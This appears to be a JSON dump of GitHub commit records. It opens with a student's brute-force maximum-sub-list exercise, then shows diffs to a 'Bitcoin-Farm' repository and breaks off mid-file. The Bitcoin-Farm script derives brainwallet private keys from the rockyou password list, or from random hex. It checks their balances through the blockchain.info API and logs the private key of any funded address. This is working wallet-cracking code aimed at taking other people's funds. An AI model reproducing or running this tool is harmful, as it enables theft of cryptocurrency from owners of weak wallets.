subList = empty List\n-            subListTotal := 0\n-            for i := start to end do\n-                subList.append(numbers[end])\n-                subListTotal += numbers[end]\n-            endfor\n+            subList.append(numbers[end])\n+            subListTotal += numbers[end]\n             if(subListTotal > bestSubListTotal) then\n                 bestSubListTotal = subListTotal\n-                bestSubList = subList\n+                bestSubList = subList.copy() # to ensure the result does not change unless desired\n             endif\n         endfor\n     endfor\n@@ -47,17 +45,18 @@ def largest_sub_list(numbers: list)->list:\n     bestSubList = []\n     bestSubListTotal = -9999999 # Python integers are unbounded so there is no minimum\n     for start in range(len(numbers)):\n+        sub_list = []\n+        sub_list_total = 0\n         for end in range(start,len(numbers)):\n-            sub_list = []\n-            sub_list_total = 0\n-            for i in range(start, end):\n-                sub_list.append(numbers[i])\n-                sub_list_total += numbers[i]\n+            sub_list.append(numbers[end])\n+            sub_list_total += numbers[end]\n             if(sub_list_total>bestSubListTotal):\n                 bestSubListTotal = sub_list_total\n-                bestSubList = sub_list\n+                bestSubList = sub_list.copy()\n     return bestSubList\n \n+# This does n*(n-1)\/2 comparisons\n+\n print(\"---\")\n print(largest_sub_list([ -2, 1, -3, 4, -1, 2, 1, -5, 4 ]))\n # [4, -1, 2, 1]\n@@ -66,4 +65,7 @@ def largest_sub_list(numbers: list)->list:\n --==Could you think of a better approach?==--\n This is quite difficult, and a better approach will be explained during the seminar session. But\n it does not hurt to have a thought about it beforehand.\n-'''\n\\ No newline at end of file\n+'''\n+\n+# Maybe sum pairs of the numbers and generate a new list. I.e., -2+1 = -1, -3+4=1\n+# Then maybe sum those down (maybe not)\n","files":{"\/Week Five\/main_w5_seminar.py":{"changes":[{"diff":"\n '''\n \n # Answer\n-# This is extremely inefficient method. I believe it has a time complexity classification of O(n^3)\n+# This is extremely inefficient method. I believe it has a time complexity classification of O(n^2)\n '''\n Function largestSubList(numbers:List): List\n     bestSubList = empty List\n     bestSubListTotal := -9999999 # should be the smallest possible integer\n     for start := 0 to numbers.size() do\n+        subList = empty List\n+        subListTotal := 0\n         for end := start to numbers.size() do\n-            subList = empty List\n-            subListTotal := 0\n-            for i := start to end do\n-                subList.append(numbers[end])\n-                subListTotal += numbers[end]\n-            endfor\n+            subList.append(numbers[end])\n+            subListTotal += numbers[end]\n             if(subListTotal > bestSubListTotal) then\n                 bestSubListTotal = subListTotal\n-                bestSubList = subList\n+                bestSubList = subList.copy() # to ensure the result does not change unless desired\n             endif\n         endfor\n     endfor\n","add":6,"remove":8,"filename":"\/Week Five\/main_w5_seminar.py","badparts":["            subList = empty List","            subListTotal := 0","            for i := start to end do","                subList.append(numbers[end])","                subListTotal += numbers[end]","            endfor","                bestSubList = subList"],"goodparts":["        subList = empty List","        subListTotal := 0","            subList.append(numbers[end])","            subListTotal += numbers[end]","                bestSubList = subList.copy() # to ensure the result does not change unless desired"]},{"diff":"\n     bestSubList = []\n     bestSubListTotal = -9999999 # Python integers are unbounded so there is no minimum\n     for start in range(len(numbers)):\n+        sub_list = []\n+        sub_list_total = 0\n         for end in range(start,len(numbers)):\n-            sub_list = []\n-            sub_list_total = 0\n-            for i in range(start, end):\n-                sub_list.append(numbers[i])\n-                sub_list_total += numbers[i]\n+            sub_list.append(numbers[end])\n+            sub_list_total += numbers[end]\n             if(sub_list_total>bestSubListTotal):\n                 bestSubListTotal = sub_list_total\n-                bestSubList = sub_list\n+                bestSubList = sub_list.copy()\n     return bestSubList\n \n+# This does n*(n-1)\/2 comparisons\n+\n print(\"---\")\n print(largest_sub_list([ -2, 1, -3, 4, -1, 2, 1, -5, 4 ]))\n # [4, -1, 2, 1]\n","add":7,"remove":6,"filename":"\/Week Five\/main_w5_seminar.py","badparts":["            sub_list = []","            sub_list_total = 0","            for i in range(start, end):","                sub_list.append(numbers[i])","                sub_list_total += numbers[i]","                bestSubList = sub_list"],"goodparts":["        sub_list = []","        sub_list_total = 0","            sub_list.append(numbers[end])","            sub_list_total += numbers[end]","                bestSubList = sub_list.copy()"]},{"diff":"\n --==Could you think of a better approach?==--\n This is quite difficult, and a better approach will be explained during the seminar session. But\n it does not hurt to have a thought about it beforehand.\n-'''\n\\ No newline at end of file\n+'''\n+\n+# Maybe sum pairs of the numbers and generate a new list. I.e., -2+1 = -1, -3+4=1\n+# Then maybe sum those down (maybe not)\n","add":4,"remove":1,"filename":"\/Week Five\/main_w5_seminar.py","badparts":["-==Could you think of a better approach?==--","'''"],"goodparts":["'''"]}],"source":"\n ''' Given list A of n numbers, find the largest possible sum of a contiguous sub-list. [ -2, 1, -3, 4, -1, 2, 1, -5, 4] For example, for the list given above, the contiguous sub-list with the largest sum is [4, -1, 2, 1], with sum 6(in red). --==Brute force approach==-- One obvious solution is to calculate the sum of every possible sub-list and the maximum of those would be the solution. We can start from index 0 and calculate the sum of every possible sub-list starting with the element A[0]. Then, we would calculate the sum of every possible sub-list starting with A[1], A[2] and so on up to A[n-1], where n denotes the size of the list. Note that every single element is a sub-list itself. Using the pseudo code notation shown in Seminar 1, write the brute force algorithm to solve the problem. Given a list of size n, how many comparisons are done? ''' ''' Function largestSubList(numbers:List): List bestSubList=empty List bestSubListTotal:=-9999999 for start:=0 to numbers.size() do for end:=start to numbers.size() do subList=empty List subListTotal:=0 for i:=start to end do subList.append(numbers[end]) subListTotal +=numbers[end] endfor if(subListTotal > bestSubListTotal) then bestSubListTotal=subListTotal bestSubList=subList endif endfor endfor return bestSubList ''' def largest_sub_list(numbers: list)->list: bestSubList=[] bestSubListTotal=-9999999 for start in range(len(numbers)): for end in range(start,len(numbers)): sub_list=[] sub_list_total=0 for i in range(start, end): sub_list.append(numbers[i]) sub_list_total +=numbers[i] if(sub_list_total>bestSubListTotal): bestSubListTotal=sub_list_total bestSubList=sub_list return bestSubList print(\"---\") print(largest_sub_list([ -2, 1, -3, 4, -1, 2, 1, -5, 4])) ''' --==Could you think of a better approach?==-- This is quite difficult, and a better approach will be explained during the seminar session. But it does not hurt to have a thought about it beforehand. ''' ","sourceWithComments":"# WEEK 5 - SEMINAR 2\n\n# ---- Exercise 1 ----\n'''\nGiven list A of n numbers, find the largest possible sum of a contiguous sub-list.\n\n[ -2, 1, -3, 4, -1, 2, 1, -5, 4 ]\n\nFor example, for the list given above, the contiguous sub-list with the largest sum is\n[4, -1, 2, 1], with sum 6 (in red).\n\n--==Brute force approach==--\nOne obvious solution is to calculate the sum of every possible sub-list and the maximum of\nthose would be the solution. We can start from index 0 and calculate the sum of every possible\nsub-list starting with the element A[0]. Then, we would calculate the sum of every possible\nsub-list starting with A[1], A[2] and so on up to A[n-1], where n denotes the size of the list.\nNote that every single element is a sub-list itself.\nUsing the pseudo code notation shown in Seminar 1, write the brute force algorithm to solve\nthe problem. Given a list of size n, how many comparisons are done?\n'''\n\n# Answer\n# This is extremely inefficient method. I believe it has a time complexity classification of O(n^3)\n'''\nFunction largestSubList(numbers:List): List\n    bestSubList = empty List\n    bestSubListTotal := -9999999 # should be the smallest possible integer\n    for start := 0 to numbers.size() do\n        for end := start to numbers.size() do\n            subList = empty List\n            subListTotal := 0\n            for i := start to end do\n                subList.append(numbers[end])\n                subListTotal += numbers[end]\n            endfor\n            if(subListTotal > bestSubListTotal) then\n                bestSubListTotal = subListTotal\n                bestSubList = subList\n            endif\n        endfor\n    endfor\n    return bestSubList\n'''\n\n# Python version\ndef largest_sub_list(numbers: list)->list:\n    bestSubList = []\n    bestSubListTotal = -9999999 # Python integers are unbounded so there is no minimum\n    for start in range(len(numbers)):\n        for end in range(start,len(numbers)):\n            sub_list = []\n            sub_list_total = 0\n            for i in range(start, end):\n                sub_list.append(numbers[i])\n                sub_list_total += numbers[i]\n            if(sub_list_total>bestSubListTotal):\n                bestSubListTotal = sub_list_total\n                bestSubList = sub_list\n    return bestSubList\n\nprint(\"---\")\nprint(largest_sub_list([ -2, 1, -3, 4, -1, 2, 1, -5, 4 ]))\n# [4, -1, 2, 1]\n\n'''\n--==Could you think of a better approach?==--\nThis is quite difficult, and a better approach will be explained during the seminar session. But\nit does not hurt to have a thought about it beforehand.\n'''"}},"msg":"Improved brute force"}},"https:\/\/github.com\/raphaelsander\/Bitcoin-Farm":{"cd4b1450340941b06dcd5edf7cf2cd9a66f9d544":{"url":"https:\/\/api.github.com\/repos\/raphaelsander\/Bitcoin-Farm\/commits\/cd4b1450340941b06dcd5edf7cf2cd9a66f9d544","html_url":"https:\/\/github.com\/raphaelsander\/Bitcoin-Farm\/commit\/cd4b1450340941b06dcd5edf7cf2cd9a66f9d544","message":"Improved code and joined brute force part to same file","sha":"cd4b1450340941b06dcd5edf7cf2cd9a66f9d544","keyword":"brute force improve","diff":"diff --git a\/bitcoin_farm_multithread.py b\/bitcoin_farm_multithread.py\nindex 3bac5c0..f788a3e 100644\n--- a\/bitcoin_farm_multithread.py\n+++ b\/bitcoin_farm_multithread.py\n@@ -4,6 +4,7 @@\n from time import ctime\n from bitcoin import *\n from os import mkdir\n+import multiprocessing\n import requests\n import urllib3\n import base58\n@@ -21,12 +22,11 @@\n # Disabled Insecure Request Warning\n urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n \n-try:\n-    mkdir(\"logs\")\n-    print(\"%s - INFO - The directory logs created\" % ctime())\n-\n-except FileExistsError:\n-    print(\"%s - INFO - The directory logs exist\" % ctime())\n+# Wordlist or Brute Force\n+if os.getenv(\"WORDLIST\") is True:\n+    wordlist = True\n+else:\n+    wordlist = False\n \n \n def write_logs(file, output):\n@@ -55,15 +55,42 @@ def wif_uncompressed(byte, raw_private_key):\n     return wif.decode(\"utf-8\")\n \n \n-def generate_addresses(n):\n-    addresses = []\n+def generate_addresses(q, n, wordlist):\n+\n+    if wordlist is True:\n+\n+        with open(\"E:\/rockyou.txt\", errors=\"ignore\") as fp:\n+            file_name = os.path.basename(fp.name)\n+            print(\"%s - File %s opened\" % (ctime(), file_name))\n+\n+            addresses = []\n+\n+            for i, line in enumerate(fp):\n+\n+                while q.qsize() >= 20:\n+                    time.sleep(1)\n+\n+                raw_private_key = line\n+\n+                if len(addresses) < n:\n+                    wallet = [wif_uncompressed('80', sha256(raw_private_key)), pubtoaddr(privtopub(sha256(raw_private_key)))]\n+                    addresses.append(wallet)\n \n-    for address in range(0, n):\n-        raw_private_key = ''.join(['%x' % random.randrange(16) for x in range(0, 64)])\n-        wallet = [wif_uncompressed('80', raw_private_key), pubtoaddr(privtopub(raw_private_key))]\n-        addresses.append(wallet)\n+                else:\n+                    q.put(addresses)\n+                    addresses = []\n+\n+    else:\n+        while True:\n+            if q.qsize() < 5:\n+                addresses = []\n \n-    return addresses\n+                for address in range(0, n):\n+                    raw_private_key = ''.join(['%x' % random.randrange(16) for x in range(0, 64)])\n+                    wallet = [wif_uncompressed('80', raw_private_key), pubtoaddr(privtopub(raw_private_key))]\n+                    addresses.append(wallet)\n+\n+                q.put(addresses)\n \n \n def create_url(addresses, n):\n@@ -85,48 +112,63 @@ def __init__(self, num):\n         self.num = num\n \n     def run(self):\n-        global total\n-\n         while True:\n-            try:\n-                addresses = generate_addresses(n)\n-                url = create_url(addresses, n)\n-\n-                req2 = requests.get(url)\n-                if req2.status_code == 200:\n-                    content2 = req2.content\n-\n-                    addresses2 = json.loads(content2.decode(\"utf-8\"))\n-                    for xy in addresses2:\n-                        if addresses2['%s' % xy]['final_balance'] != 0:\n-                            for xyz in range(0, n):\n-                                if addresses[xyz][1] == xy:\n-                                    output = (\"PublicKey:%s Balance:%s PrivateKey:%s\" % (\n-                                        xy, addresses2['%s' % xy]['final_balance'], addresses[xyz][0]))\n-                                    print(output)\n-                                    write_logs(\"keys\", output)\n-                        if addresses2['%s' % xy]['total_received'] != 0:\n-                            for xyz in range(0, n):\n-                                if addresses[xyz][1] == xy:\n-                                    output = (\"PublicKey:%s Received:%s PrivateKey:%s\" % (\n-                                        xy, addresses2['%s' % xy]['total_received'], addresses[xyz][0]))\n-                                    print(output)\n-                                    write_logs(\"keys\", output)\n-                    total += 128\n+            time.sleep(10)\n+            print(\"%s - INFO - Total verified: %s\" % (ctime(), total))\n \n-                else:\n-                    print(\"%s - Error - Status Code: %s - URL: %s\" % (ctime(), req2.status_code, url))\n \n-            except TimeoutError:\n-                output = (\"%s - ERROR - TimeoutError - URL: %s\" % (ctime(), url))\n-                print(output)\n-                write_logs(\"error\", output)\n+if __name__ == '__main__':\n+    try:\n+        mkdir(\"logs\")\n+        print(\"%s - INFO - The directory logs created\" % ctime())\n \n+    except FileExistsError:\n+        print(\"%s - INFO - The directory logs exist\" % ctime())\n \n-for x in range(0, 1):\n-    a = Th(x)\n+    a = Th(1)\n     a.start()\n \n-while True:\n-    time.sleep(10)\n-    print(\"%s - INFO - Total verified: %s\" % (ctime(), total))\n+    q = multiprocessing.Queue()\n+    p = multiprocessing.Process(name='generate_addresses', target=generate_addresses, args=(q, n, wordlist))\n+    p.start()\n+\n+    while True:\n+        addresses = q.get()\n+\n+        url = create_url(addresses, n)\n+\n+        req2 = requests.get(url)\n+        if req2.status_code == 200:\n+            content2 = req2.content\n+\n+            addresses2 = json.loads(content2.decode(\"utf-8\"))\n+            for xy in addresses2:\n+\n+                if addresses2['%s' % xy]['final_balance'] != 0:\n+\n+                    for xyz in range(0, n):\n+\n+                        if addresses[xyz][1] == xy:\n+\n+                            output = (\"PublicKey:%s Balance:%s PrivateKey:%s\" % (\n+                                xy, addresses2['%s' % xy]['final_balance'], addresses[xyz][0]))\n+\n+                            print(output)\n+                            write_logs(\"keys\", output)\n+\n+                if addresses2['%s' % xy]['total_received'] != 0:\n+\n+                    for xyz in range(0, n):\n+\n+                        if addresses[xyz][1] == xy:\n+\n+                            output = (\"PublicKey:%s Received:%s PrivateKey:%s\" % (\n+                                xy, addresses2['%s' % xy]['total_received'], addresses[xyz][0]))\n+\n+                            print(output)\n+                            write_logs(\"keys\", output)\n+\n+            total += n\n+\n+        else:\n+            print(\"%s - Error - Status Code: %s - URL: %s\" % (ctime(), req2.status_code, url))\ndiff --git a\/brute.py b\/brute.py\ndeleted file mode 100644\nindex 209516b..0000000\n--- a\/brute.py\n+++ \/dev\/null\n@@ -1,52 +0,0 @@\n-#!\/usr\/bin\/python3\r\n-\r\n-from bitcoin import *\r\n-import requests\r\n-import json\r\n-import os\r\n-\r\n-list = []\r\n-\r\n-with open(\"E:\/rockyou.txt\", errors=\"ignore\") as fp:\r\n-    file_name = os.path.basename(fp.name)\r\n-    print(file_name)\r\n-    for i, line in enumerate(fp):\r\n-        if i > int(open('state', 'r').read().split(\":\")[1]):\r\n-            if len(list) < 128:\r\n-                wallet = [sha256(line), pubtoaddr(privtopub(sha256(line)))]\r\n-                list.append(wallet)\r\n-\r\n-            else:\r\n-                #print(list)\r\n-                addresses = \"\"\r\n-                for y in range(0, 128):\r\n-                    addresses += str(list[y][1])\r\n-\r\n-                    if y < 127:\r\n-                        addresses += \"|\"\r\n-\r\n-                req2 = requests.get(\"https:\/\/blockchain.info\/balance?active=%s\" % addresses)\r\n-                content2 = req2.content\r\n-\r\n-                addresses2 = json.loads(content2.decode(\"utf-8\"))\r\n-                for xy in addresses2:\r\n-                    if addresses2['%s' % xy]['final_balance'] != 0:\r\n-                        for xyz in range(0, 128):\r\n-                            if list[xyz][1] == xy:\r\n-                                output = (\"PublicKey:%s Balance:%s PrivateKey:%s\" % (\r\n-                                          xy, addresses2['%s' % xy]['final_balance'], list[xyz][0]))\r\n-                                print(output)\r\n-                                #os.system('echo %s >> \/home\/pi\/keys.txt' % output)\r\n-\r\n-                    if addresses2['%s' % xy]['total_received'] != 0:\r\n-                        for xyz in range(0, 128):\r\n-                            if list[xyz][1] == xy:\r\n-                                output = (\"PublicKey:%s Received:%s PrivateKey:%s\" % (\r\n-                                          xy, addresses2['%s' % xy]['total_received'], list[xyz][0]))\r\n-                                print(output)\r\n-                                #os.system('echo %s >> \/home\/pi\/keys.txt' % output)\r\n-\r\n-                list = []\r\n-                f = open(\"state\", \"w\")\r\n-                f.write(\"%s:%s\" % (file_name, i))\r\n-                f.close()\r\n","files":{"\/bitcoin_farm_multithread.py":{"changes":[{"diff":"\n urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n \n-try:\n-    mkdir(\"logs\")\n-    print(\"%s - INFO - The directory logs created\" % ctime())\n-\n-except FileExistsError:\n-    print(\"%s - INFO - The directory logs exist\" % ctime())\n+# Wordlist or Brute Force\n+if os.getenv(\"WORDLIST\") is True:\n+    wordlist = True\n+else:\n+    wordlist = False\n \n \n def write_logs(file, output):\n","add":5,"remove":6,"filename":"\/bitcoin_farm_multithread.py","badparts":["try:","    mkdir(\"logs\")","    print(\"%s - INFO - The directory logs created\" % ctime())","except FileExistsError:","    print(\"%s - INFO - The directory logs exist\" % ctime())"],"goodparts":["if os.getenv(\"WORDLIST\") is True:","    wordlist = True","else:","    wordlist = False"]},{"diff":"\n     return wif.decode(\"utf-8\")\n \n \n-def generate_addresses(n):\n-    addresses = []\n+def generate_addresses(q, n, wordlist):\n+\n+    if wordlist is True:\n+\n+        with open(\"E:\/rockyou.txt\", errors=\"ignore\") as fp:\n+            file_name = os.path.basename(fp.name)\n+            print(\"%s - File %s opened\" % (ctime(), file_name))\n+\n+            addresses = []\n+\n+            for i, line in enumerate(fp):\n+\n+                while q.qsize() >= 20:\n+                    time.sleep(1)\n+\n+                raw_private_key = line\n+\n+                if len(addresses) < n:\n+                    wallet = [wif_uncompressed('80', sha256(raw_private_key)), pubtoaddr(privtopub(sha256(raw_private_key)))]\n+                    addresses.append(wallet)\n \n-    for address in range(0, n):\n-        raw_private_key = ''.join(['%x' % random.randrange(16) for x in range(0, 64)])\n-        wallet = [wif_uncompressed('80', raw_private_key), pubtoaddr(privtopub(raw_private_key))]\n-        addresses.append(wallet)\n+                else:\n+                    q.put(addresses)\n+                    addresses = []\n+\n+    else:\n+        while True:\n+            if q.qsize() < 5:\n+                addresses = []\n \n-    return addresses\n+                for address in range(0, n):\n+                    raw_private_key = ''.join(['%x' % random.randrange(16) for x in range(0, 64)])\n+                    wallet = [wif_uncompressed('80', raw_private_key), pubtoaddr(privtopub(raw_private_key))]\n+                    addresses.append(wallet)\n+\n+                q.put(addresses)\n \n \n def create_url(addresses, n):\n","add":34,"remove":7,"filename":"\/bitcoin_farm_multithread.py","badparts":["def generate_addresses(n):","    addresses = []","    for address in range(0, n):","        raw_private_key = ''.join(['%x' % random.randrange(16) for x in range(0, 64)])","        wallet = [wif_uncompressed('80', raw_private_key), pubtoaddr(privtopub(raw_private_key))]","        addresses.append(wallet)","    return addresses"],"goodparts":["def generate_addresses(q, n, wordlist):","    if wordlist is True:","        with open(\"E:\/rockyou.txt\", errors=\"ignore\") as fp:","            file_name = os.path.basename(fp.name)","            print(\"%s - File %s opened\" % (ctime(), file_name))","            addresses = []","            for i, line in enumerate(fp):","                while q.qsize() >= 20:","                    time.sleep(1)","                raw_private_key = line","                if len(addresses) < n:","                    wallet = [wif_uncompressed('80', sha256(raw_private_key)), pubtoaddr(privtopub(sha256(raw_private_key)))]","                    addresses.append(wallet)","                else:","                    q.put(addresses)","                    addresses = []","    else:","        while True:","            if q.qsize() < 5:","                addresses = []","                for address in range(0, n):","                    raw_private_key = ''.join(['%x' % random.randrange(16) for x in range(0, 64)])","                    wallet = [wif_uncompressed('80', raw_private_key), pubtoaddr(privtopub(raw_private_key))]","                    addresses.append(wallet)","                q.put(addresses)"]},{"diff":"\n         self.num = num\n \n     def run(self):\n-        global total\n-\n         while True:\n-            try:\n-                addresses = generate_addresses(n)\n-                url = create_url(addresses, n)\n-\n-                req2 = requests.get(url)\n-                if req2.status_code == 200:\n-                    content2 = req2.content\n-\n-                    addresses2 = json.loads(content2.decode(\"utf-8\"))\n-                    for xy in addresses2:\n-                        if addresses2['%s' % xy]['final_balance'] != 0:\n-                            for xyz in range(0, n):\n-                                if addresses[xyz][1] == xy:\n-                                    output = (\"PublicKey:%s Balance:%s PrivateKey:%s\" % (\n-                                        xy, addresses2['%s' % xy]['final_balance'], addresses[xyz][0]))\n-                                    print(output)\n-                                    write_logs(\"keys\", output)\n-                        if addresses2['%s' % xy]['total_received'] != 0:\n-                            for xyz in range(0, n):\n-                                if addresses[xyz][1] == xy:\n-                                    output = (\"PublicKey:%s Received:%s PrivateKey:%s\" % (\n-                                        xy, addresses2['%s' % xy]['total_received'], addresses[xyz][0]))\n-                                    print(output)\n-                                    write_logs(\"keys\", output)\n-                    total += 128\n+            time.sleep(10)\n+            print(\"%s - INFO - Total verified: %s\" % (ctime(), total))\n \n-                else:\n-                    print(\"%s - Error - Status Code: %s - URL: %s\" % (ctime(), req2.status_code, url))\n \n-            except TimeoutError:\n-                output = (\"%s - ERROR - TimeoutError - URL: %s\" % (ctime(), url))\n-                print(output)\n-                write_logs(\"error\", output)\n+if __name__ == '__main__':\n+    try:\n+        mkdir(\"logs\")\n+        print(\"%s - INFO - The directory logs created\" % ctime())\n \n+    except FileExistsError:\n+        print(\"%s - INFO - The directory logs exist\" % ctime())\n \n-for x in range(0, 1):\n-    a = Th(x)\n+    a = Th(1)\n     a.start()\n \n-while True:\n-    time.sleep(10)\n-    print(\"%s - INFO - Total verified: %s\" % (ctime(), total))\n+    q = multiprocessing.Queue()\n+    p = multiprocessing.Process(name='generate_addresses', target=generate_addresses, args=(q, n, wordlist))\n+    p.start()\n+\n+    while True:\n+        addresses = q.get()\n+\n+        url = create_url(addresses, n)\n+\n+        req2 = requests.get(url)\n+        if req2.status_code == 200:\n+            content2 = req2.content\n+\n+            addresses2 = json.loads(content2.decode(\"utf-8\"))\n+            for xy in addresses2:\n+\n+                if addresses2['%s' % xy]['final_balance'] != 0:\n+\n+                    for xyz in range(0, n):\n+\n+                        if addresses[xyz][1] == xy:\n+\n+                            output = (\"PublicKey:%s Balance:%s PrivateKey:%s\" % (\n+                                xy, addresses2['%s' % xy]['final_balance'], addresses[xyz][0]))\n+\n+                            print(output)\n+                            write_logs(\"keys\", output)\n+\n+                if addresses2['%s' % xy]['total_received'] != 0:\n+\n+                    for xyz in range(0, n):\n+\n+                        if addresses[xyz][1] == xy:\n+\n+                            output = (\"PublicKey:%s Received:%s PrivateKey:%s\" % (\n+                                xy, addresses2['%s' % xy]['total_received'], addresses[xyz][0]))\n+\n+                            print(output)\n+                            write_logs(\"keys\", output)\n+\n+            total += n\n+\n+        else:\n+            print(\"%s - Error - Status Code: %s - URL: %s\" % (ctime(), req2.status_code, url))","add":53,"remove":38,"filename":"\/bitcoin_farm_multithread.py","badparts":["        global total","            try:","                addresses = generate_addresses(n)","                url = create_url(addresses, n)","                req2 = requests.get(url)","                if req2.status_code == 200:","                    content2 = req2.content","                    addresses2 = json.loads(content2.decode(\"utf-8\"))","                    for xy in addresses2:","                        if addresses2['%s' % xy]['final_balance'] != 0:","                            for xyz in range(0, n):","                                if addresses[xyz][1] == xy:","                                    output = (\"PublicKey:%s Balance:%s PrivateKey:%s\" % (","                                        xy, addresses2['%s' % xy]['final_balance'], addresses[xyz][0]))","                                    print(output)","                                    write_logs(\"keys\", output)","                        if addresses2['%s' % xy]['total_received'] != 0:","                            for xyz in range(0, n):","                                if addresses[xyz][1] == xy:","                                    output = (\"PublicKey:%s Received:%s PrivateKey:%s\" % (","                                        xy, addresses2['%s' % xy]['total_received'], addresses[xyz][0]))","                                    print(output)","                                    write_logs(\"keys\", output)","                    total += 128","                else:","                    print(\"%s - Error - Status Code: %s - URL: %s\" % (ctime(), req2.status_code, url))","            except TimeoutError:","                output = (\"%s - ERROR - TimeoutError - URL: %s\" % (ctime(), url))","                print(output)","                write_logs(\"error\", output)","for x in range(0, 1):","    a = Th(x)","while True:","    time.sleep(10)","    print(\"%s - INFO - Total verified: %s\" % (ctime(), total))"],"goodparts":["            time.sleep(10)","            print(\"%s - INFO - Total verified: %s\" % (ctime(), total))","if __name__ == '__main__':","    try:","        mkdir(\"logs\")","        print(\"%s - INFO - The directory logs created\" % ctime())","    except FileExistsError:","        print(\"%s - INFO - The directory logs exist\" % ctime())","    a = Th(1)","    q = multiprocessing.Queue()","    p = multiprocessing.Process(name='generate_addresses', target=generate_addresses, args=(q, n, wordlist))","    p.start()","    while True:","        addresses = q.get()","        url = create_url(addresses, n)","        req2 = requests.get(url)","        if req2.status_code == 200:","            content2 = req2.content","            addresses2 = json.loads(content2.decode(\"utf-8\"))","            for xy in addresses2:","                if addresses2['%s' % xy]['final_balance'] != 0:","                    for xyz in range(0, n):","                        if addresses[xyz][1] == xy:","                            output = (\"PublicKey:%s Balance:%s PrivateKey:%s\" % (","                                xy, addresses2['%s' % xy]['final_balance'], addresses[xyz][0]))","                            print(output)","                            write_logs(\"keys\", output)","                if addresses2['%s' % xy]['total_received'] != 0:","                    for xyz in range(0, n):","                        if addresses[xyz][1] == xy:","                            output = (\"PublicKey:%s Received:%s PrivateKey:%s\" % (","                                xy, addresses2['%s' % xy]['total_received'], addresses[xyz][0]))","                            print(output)","                            write_logs(\"keys\", output)","            total += n","        else:","            print(\"%s - Error - Status Code: %s - URL: %s\" % (ctime(), req2.status_code, url))"]}],"source":"\n from threading import Thread from time import ctime from bitcoin import * from os import mkdir import requests import urllib3 import base58 import json n=138 total=0 b58='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz' urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) try: mkdir(\"logs\") print(\"%s -INFO -The directory logs created\" % ctime()) except FileExistsError: print(\"%s -INFO -The directory logs exist\" % ctime()) def write_logs(file, output): if file==\"error\": f=open(\"logs\/error.txt\", \"a\") elif file==\"keys\": f=open(\"logs\/keys.txt\", \"a\") else: print(\"%s -ERROR -Log file don't found: %s\" %(ctime(), file)) return output=output +\"\\n\" f.write(output) f.close() def wif_uncompressed(byte, raw_private_key): extended_key=byte+raw_private_key first_sha256=hashlib.sha256(binascii.unhexlify(extended_key[:66])).hexdigest() second_sha256=hashlib.sha256(binascii.unhexlify(first_sha256)).hexdigest() final_key=extended_key[:66]+second_sha256[:8] wif=base58.b58encode(binascii.unhexlify(final_key)) return wif.decode(\"utf-8\") def generate_addresses(n): addresses=[] for address in range(0, n): raw_private_key=''.join(['%x' % random.randrange(16) for x in range(0, 64)]) wallet=[wif_uncompressed('80', raw_private_key), pubtoaddr(privtopub(raw_private_key))] addresses.append(wallet) return addresses def create_url(addresses, n): public_keys=\"\" for i in range(0, n): public_keys +=addresses[i][1] if i < n -1: public_keys +=\"|\" url=\"https:\/\/blockchain.info\/balance?active=\" +public_keys return url class Th(Thread): def __init__(self, num): Thread.__init__(self) self.num=num def run(self): global total while True: try: addresses=generate_addresses(n) url=create_url(addresses, n) req2=requests.get(url) if req2.status_code==200: content2=req2.content addresses2=json.loads(content2.decode(\"utf-8\")) for xy in addresses2: if addresses2['%s' % xy]['final_balance'] !=0: for xyz in range(0, n): if addresses[xyz][1]==xy: output=(\"PublicKey:%s Balance:%s PrivateKey:%s\" %( xy, addresses2['%s' % xy]['final_balance'], addresses[xyz][0])) print(output) write_logs(\"keys\", output) if addresses2['%s' % xy]['total_received'] !=0: for xyz in range(0, n): if addresses[xyz][1]==xy: output=(\"PublicKey:%s Received:%s PrivateKey:%s\" %( xy, addresses2['%s' % xy]['total_received'], addresses[xyz][0])) print(output) write_logs(\"keys\", output) total +=128 else: print(\"%s -Error -Status Code: %s -URL: %s\" %(ctime(), req2.status_code, url)) except TimeoutError: output=(\"%s -ERROR -TimeoutError -URL: %s\" %(ctime(), url)) print(output) write_logs(\"error\", output) for x in range(0, 1): a=Th(x) a.start() while True: time.sleep(10) print(\"%s -INFO -Total verified: %s\" %(ctime(), total)) ","sourceWithComments":"#!\/usr\/bin\/python3\n\nfrom threading import Thread\nfrom time import ctime\nfrom bitcoin import *\nfrom os import mkdir\nimport requests\nimport urllib3\nimport base58\nimport json\n\n\n# Number of wallets verify per request to blockchain.info API.\n# Number maximum is 138 and minimum is 1.\nn = 138\n\n# Don't change the values below\ntotal = 0\nb58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'\n\n# Disabled Insecure Request Warning\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\ntry:\n    mkdir(\"logs\")\n    print(\"%s - INFO - The directory logs created\" % ctime())\n\nexcept FileExistsError:\n    print(\"%s - INFO - The directory logs exist\" % ctime())\n\n\ndef write_logs(file, output):\n    if file == \"error\":\n        f = open(\"logs\/error.txt\", \"a\")\n    elif file == \"keys\":\n        f = open(\"logs\/keys.txt\", \"a\")\n    else:\n        print(\"%s - ERROR - Log file don't found: %s\" % (ctime(), file))\n        return\n\n    output = output + \"\\n\"\n    f.write(output)\n    f.close()\n\n\ndef wif_uncompressed(byte, raw_private_key):\n    extended_key = byte+raw_private_key\n\n    first_sha256 = hashlib.sha256(binascii.unhexlify(extended_key[:66])).hexdigest()\n    second_sha256 = hashlib.sha256(binascii.unhexlify(first_sha256)).hexdigest()\n\n    final_key = extended_key[:66]+second_sha256[:8]\n\n    wif = base58.b58encode(binascii.unhexlify(final_key))\n    return wif.decode(\"utf-8\")\n\n\ndef generate_addresses(n):\n    addresses = []\n\n    for address in range(0, n):\n        raw_private_key = ''.join(['%x' % random.randrange(16) for x in range(0, 64)])\n        wallet = [wif_uncompressed('80', raw_private_key), pubtoaddr(privtopub(raw_private_key))]\n        addresses.append(wallet)\n\n    return addresses\n\n\ndef create_url(addresses, n):\n    public_keys = \"\"\n\n    for i in range(0, n):\n        public_keys += addresses[i][1]\n\n        if i < n - 1:\n            public_keys += \"|\"\n\n    url = \"https:\/\/blockchain.info\/balance?active=\" + public_keys\n    return url\n\n\nclass Th(Thread):\n    def __init__(self, num):\n        Thread.__init__(self)\n        self.num = num\n\n    def run(self):\n        global total\n\n        while True:\n            try:\n                addresses = 